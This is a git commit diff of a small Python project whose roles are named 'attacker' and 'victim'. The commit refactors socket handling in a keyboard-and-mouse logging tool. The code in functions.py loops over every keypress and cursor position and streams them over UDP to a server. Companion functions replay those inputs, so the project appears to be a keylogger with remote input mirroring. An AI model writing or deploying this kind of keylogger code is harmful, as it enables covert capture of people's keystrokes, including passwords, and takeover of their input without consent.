41ff89312d08610029e54dcdda1b4f3ea1becf64
mrvs0 <mrvs025@gmail.com>
2023-01-02 19:33:22 +0200

    changing the socket to the clients

--- attacker client.py
+++ attacker client.py
@@ -1,14 +1,17 @@
 import functions
 from threading import Thread
+import socket
 
 
 def main():
+    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     server_ip = ('127.0.0.1', 42069)
     ip_for_conection = ('127.0.0.1', 420)
 
-    functions.connect_as_attacker(ip_for_connection_as_attacker=ip_for_conection, ip_of_server=server_ip)
-    Thread(target=functions.log_keyboard, args=(server_ip,)).start()
-    Thread(target=functions.log_mouse, args=(server_ip,)).start()
+    functions.connect_as_attacker(ip_for_connection_as_attacker=ip_for_conection, ip_of_server=server_ip,
+                                  attacker_socket=attacker_socket)
+    Thread(target=functions.log_keyboard, args=(server_ip, attacker_socket,)).start()
+    Thread(target=functions.log_mouse, args=(server_ip, attacker_socket,)).start()
 
 
 if __name__ == '__main__':
--- functions.py
+++ functions.py
@@ -1,28 +1,28 @@
-import pyautogui as pg
-import keyboard as kb
 import socket
 
-function_class_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+import pyautogui as pg
+import keyboard as kb
+
 screen_width, screen_height = pg.size()
 
 
-def log_keyboard(server_ip: tuple):
+def log_keyboard(server_ip: tuple, attacker_socket: socket.socket):
     while 1:
-        recorded = f'{kb.read_key()}'
-        function_class_socket.sendto(recorded.encode(), server_ip)
+        recorded = f'k{kb.read_key()}'
+        attacker_socket.sendto(recorded.encode(), server_ip)
 
 
 def recreate_keyboard(button: str):
     pg.press(button)
 
 
-def log_mouse(server_ip: tuple):
+def log_mouse(server_ip: tuple, attacker_socket: socket.socket):
     pos = pg.position()
     while 1:
         pos_now = (pg.position()[0] * 100 // screen_width, pg.position()[1] * 100 // screen_height)
         if pos_now != pos:
             pos = pos_now
-            function_class_socket.sendto(f'{pos}'.encode(), server_ip)
+            attacker_socket.sendto(f'm{pos}'.encode(), server_ip)
 
 
 def recreate_mouse_movement(pos: str):
@@ -32,13 +32,13 @@ def recreate_mouse_movement(pos: str):
     pg.moveTo(x, y)
 
 
-def connect_as_attacker(ip_for_connection_as_attacker: tuple, ip_of_server: tuple):
-    function_class_socket.sendto('i am the attacker'.encode(), ip_for_connection_as_attacker)
-    function_class_socket.recvfrom(1024)
-    function_class_socket.sendto('ignore'.encode(), ip_of_server)
+def connect_as_attacker(ip_for_connection_as_attacker: tuple, ip_of_server: tuple, attacker_socket: socket.socket):
+    attacker_socket.sendto('i am the attacker'.encode(), ip_for_connection_as_attacker)
+    attacker_socket.recvfrom(1024)
+    attacker_socket.sendto('ignore'.encode(), ip_of_server)
 
 
-def connect_as_victim(ip_for_victims: tuple, ip_of_server: tuple):
-    function_class_socket.sendto('i am a victim'.encode(), ip_for_victims)
-    function_class_socket.recvfrom(1024)
-    function_class_socket.sendto('ignore'.encode(), ip_of_server)
+def connect_as_victim(ip_for_victims: tuple, ip_of_server: tuple, socket_of_victim: socket.socket):
+    socket_of_victim.sendto('i am a victim'.encode(), ip_for_victims)
+    socket_of_victim.recvfrom(1024)
+    socket_of_victim.sendto('ignore'.encode(), ip_of_server)
